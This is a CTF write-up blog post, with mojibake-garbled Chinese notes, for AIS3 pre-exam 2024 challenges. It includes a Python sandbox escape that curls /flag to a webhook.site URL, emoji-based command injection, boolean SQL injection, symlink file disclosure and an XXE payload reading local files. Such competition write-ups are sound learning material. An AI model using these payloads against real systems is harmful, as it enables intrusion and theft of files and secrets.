---
layout: post
title: "[CTF] AIS3-Pre-exam-2024 Writeup"
date: 2024-05-30 +0800
categories: CTF
hidden: false
---

## AIS3 pre-exam 2024
### Evil Calculator
- expression æœ‰éæ¿¾`_`
- ç„¡æ³•ç›´æ¥å›é¡¯ï¼Œå¯ç”¨curlå¸¶å‡º
```
{"expression":"eval(data['test'])",
"test":"''.__class__.__base__.__subclasses__()[154].__init__.__globals__['system']('curl https://webhook.site/49d52fa6-4db9-4ad8-8b6e-ee41224137b0 -d $(cat /flag)')"}
```

![](/images/2024/05/SkywNWyVC.png)

![](/images/2024/05/rJmON-1VC.png)


### The Long Print

- ç”¨ghidra patchæ‰sleep()

![](/images/2024/05/S1fflXJE0.png)

### Three Dimensional Secret

[https://nraynaud.github.io/webgcode/](https://nraynaud.github.io/webgcode/)

![](/images/2024/05/r1cc57kVA.png)

### Quantum Nim Heist

- æŒ‰ä¸‹3ï¼Œå¯ä»¥å¼·åˆ¶è®“é›»è…¦èµ°ä¸€æ­¥
![](/images/2024/05/H1I594yNA.png)

### Emoji Console

- source code

```python
#!/usr/local/bin/python3

import os
from flask import Flask,send_file,request,redirect,jsonify,render_template
import json
import string
def translate(command:str)->str:
    emoji_table = json.load(open('emoji.json','r',encoding='utf-8'))
    for key in emoji_table:
        if key in command:
            command = command.replace(key,emoji_table[key])
    return command.lower()

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api')
def api():
    command = request.args.get('command')

    if len(set(command).intersection(set(string.printable.replace(" ",''))))>0:
        return jsonify({'command':command,'result':'Invalid command'})
    command = translate(command)
    result = os.popen(command+" 2>&1").read()
    return jsonify({'command':command,'result':result})


if __name__ == '__main__':
    app.run('0.0.0.0',5000)

{
    "ğŸ˜": ":|",
    "ğŸ¤¬": "#$%&!",
    "ğŸ’¿": "CD",
    "â­": "*",
    "ğŸ±": "cat",
    "ğŸ˜“": ";/",
    "ğŸš©": "flag",
    }
```

- æ–¹æ³•1

- å› ç‚ºåˆ†è™Ÿæˆªæ–·ä¹‹å¾Œï¼Œ&è®“å¾Œé¢èƒŒæ™¯åŸ·è¡Œï¼Œ!ä¸å½±éŸ¿åŸ·è¡Œ

```
cd flag ;/:$#$%&! cat *
```

![](/images/2024/05/H1tjPUyEA.png)

```
cd flag ;/:$#$%&! python *
```

![](/images/2024/05/rJ4RPI1ER.png)

- æ–¹æ³•2


- åŸ·è¡Œcd flagï¼Œç„¶å¾ŒåŸ·è¡Œ p: å†æŠŠè¼¸å‡ºé¤µçµ¦ cat *

```
cd flag;p:| python *
```
![](/images/2024/05/HJX5u81NC.png)

### It's MyGO!!!!!

- boolean sql injection

    ```
    python2 mysql-truefalse.py  -u "http://chals1.ais3.org:11454/song?id=4 and 1=1" -f "/flag"
    ```

- 1=1
![](/images/2024/05/r11I0ckVR.png)
- 1=2
![](/images/2024/05/BydI0cJ4C.png)

- https://github.com/agix/My-SQL-boolean-based-injection-tools

  ![](/images/2024/05/HkaAAqJVA.png)

### It's MyGO!!!!! Part-time Worker

- ä¸Šå‚³ `ln -s /app`
 ![](/images/2024/05/ByTyin1ER.png)

- ä½†æ˜¯åœ¨ä¸Šå‚³ä¹‹å‰ï¼Œè¦å…ˆéš¨ä¾¿å‚³ä¸€å¼µç…§ç‰‡ï¼Œæ‹¿ç¾åœ¨çš„sessionçš„ç¶²å€ï¼Œä¸ç„¶æœƒå› ç‚º/appæª”æ¡ˆå¤ªå¤š(åŒ…å«å…¨éƒ¨äººsessionçš„æª”æ¡ˆ)ï¼Œç›´æ¥ç•¶æ‰ã€‚

  ![](/images/2024/05/H1Q-h314C.png)


- å¯ä»¥ç›´æ¥é€£çµåˆ° `/app`
 ![](/images/2024/05/Hk3Qi214A.png)

- å¯ä»¥çœ‹åˆ°å‰é¢æœ‰import secretï¼Œç™¼ç¾secret key
![](/images/2024/05/SyJSj3JNC.png)

- æ ¹æ“šcodeï¼ŒåŠ ä¸ŠAdmin

![](/images/2024/05/BkH932J4C.png)


![](/images/2024/05/S1gN33JER.png)


- å‚³é€packet
![](/images/2024/05/SkyLhhyE0.png)

### ç«æ‹³ã®ã‚¨ãƒ¼ã‚¹

- å¤§è‡´ä¸Šæ˜¯ä¸€é–‹å§‹æœ‰4æ®µbufferï¼Œæ¯æ®µ8å€‹å­—çš„flag
- å…ˆå»å’Œä¸€äº›hexåšXOR

![](/images/2024/05/SJZkvPgVR.png)

- å†å»åšcomplex_functionï¼Œæ¯”å°æ˜¯å¦ç‚º

![](/images/2024/05/BkaGvveNC.png)


- main func

![](/images/2024/05/S1zKLDgE0.png)

- `decode.py`

```python
a = "DHLIYJEG"
b = "MZRERYND"
c = "RUYODBAH"
d = "BKEMPBRE"

a1 = "\x0E\x0D\x7D\x06\x0F\x17\x76\x04"
a2 = "\x6d\x00\x1b\x7c\x6c\x13\x62\x11"
a3 = "\x1E\x7E\x06\x13\x07\x66\x0E\x71"
a4 = "\x17\x14\x1D\x70\x79\x67\x74\x33"



def complex_function(value1, value2):
    temp2 = 0
    temp1 = 0

    if 63 < value1 < 90:
        temp2 = (value1 + -0x41 + value2 * 0x11) % 0x1a
        temp1 = value2 % 3 + 3
        value2 = value2 % 3
        if value2 == 2:
            temp2 = ((temp2 - temp1) + 0x1a) % 0x1a
        elif value2 < 3:
            if value2 == 0:
                temp2 = (temp2 * temp1 + 7) % 0x1a
            elif value2 == 1:
                temp2 = (temp1 * 2 + temp2) % 0x1a

    return temp2 + 0x41

print("AIS3{G0D")

ans1= ""
for i in range(8):
    for value1 in range(64,90,1):
        ans = complex_function(value1,0x0+i)
        ans = chr(ans)
        if(a[i]==ans):
            ans1 = ans1 + chr(value1)

for i in range(8):
    test= ans1
    ans = ord(test[i]) ^ ord(a1[i])
    print(chr(ans),end='')
print()

ans2= ""
for i in range(8):
    for value1 in range(64,90,1):
        ans = complex_function(value1,0x20+i)
        ans = chr(ans)
        if(b[i]==ans):
            ans2 = ans2 + chr(value1)

for i in range(8):
    test= ans2
    ans = ord(test[i]) ^ ord(a2[i])
    print(chr(ans),end='')
print()

ans3 = ""
for i in range(8):
    for value1 in range(64,90,1):
        ans = complex_function(value1,0x40+i)
        ans = chr(ans)
        if(c[i]==ans):
            ans3  = ans3  + chr(value1)

for i in range(8):
    test= ans3
    ans = ord(test[i]) ^ ord(a3[i])
    print(chr(ans),end='')
print()

ans4 = ""
for i in range(8):
    for value1 in range(64,90,1):
        ans = complex_function(value1,0x60+i)
        ans = chr(ans)
        if(d[i]==ans):
            ans4  = ans4  + chr(value1)

for i in range(8):
    test= ans4
    ans = ord(test[i]) ^ ord(a4[i])
    print(chr(ans),end='')
print()
```

![](/images/2024/05/ByTdUVbNC.png)



### Ebook Parser

- XXE

{% raw %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///flag" >]>
<FictionBook xmlns="http://www.gribuser.ru/xml/fictionbook/2.0" xmlns:l="http://www.w3.org/1999/xlink">
<description>
    <title-info>
        <genre>antique</genre>
        <author><first-name></first-name><last-name>&xxe;</last-name></author>
        <book-title>&xxe;</book-title>
        <lang>&xxe;</lang>
    </title-info>
    <document-info>
        <author><first-name></first-name><last-name>Unknown</last-name></author>
        <program-used>calibre 6.13.0</program-used>
        <date>26.5.2024</date>
        <id>eb5cbf82-22b5-4331-8009-551a95342ea0</id>
        <version>1.0</version>
    </document-info>
    <publish-info>
    </publish-info>
</description>
<body>
<section>
<p>&lt;root&gt;</p>
<p>12345</p>
<p>&lt;/root&gt;</p>
</section>
</body>

</FictionBook>
```
{% endraw %}

![](/images/2024/05/SJEp8y-VC.png)

### Hash Guesser

- ç­”æ¡ˆå°±åœ¨https://github.com/python-pillow/Pillow/issues/2982

- ImageChops.difference
    - éœ€è¦ç›¸åŒçš„mode ('L')
    - å®ƒåªè¨ˆç®—å¤§å°å­é›†åœ–åƒçš„å·®ç•°ï¼Œä¾‹å¦‚ä¸€å¼µ10x10å’Œ1x1ï¼Œåªæœƒè¼¸å‡º1x1çš„ä¸åŒ
    - å› æ­¤åªè¦ä¸Šå‚³ä¸€å¼µ1x1çš„mode('L')çš„é»‘è‰²åœ–ç‰‡

- é¡Œç›®åªæœ‰é»‘ç™½ï¼Œå› æ­¤æ¯æ¬¡ä¸Šå‚³éƒ½æœ‰1/2æ©Ÿæœƒã€‚

- é©—è­‰çš„code

```python
from PIL import Image, ImageChops
import hashlib,secrets

img = Image.open('test2.png')
img = img.convert('L')
#img.save("testaaaaaaa.png","png")

h = hashlib.sha256(secrets.token_bytes(16)).hexdigest()
image = Image.new("L", (16, 16), 0)
pixels = [255 if c == '1' else 0 for c in bin(int(h, 16))[2:].zfill(256)]
image.putdata(pixels)

print(img)
print(image)

diff = ImageChops.difference(image, img)
print(diff)
print(diff.getbbox())
```

![](/images/2024/05/rygb37bN0.png)

## End

 - 15/328

![](/images/2024/05/ryZpNyQNA.png)
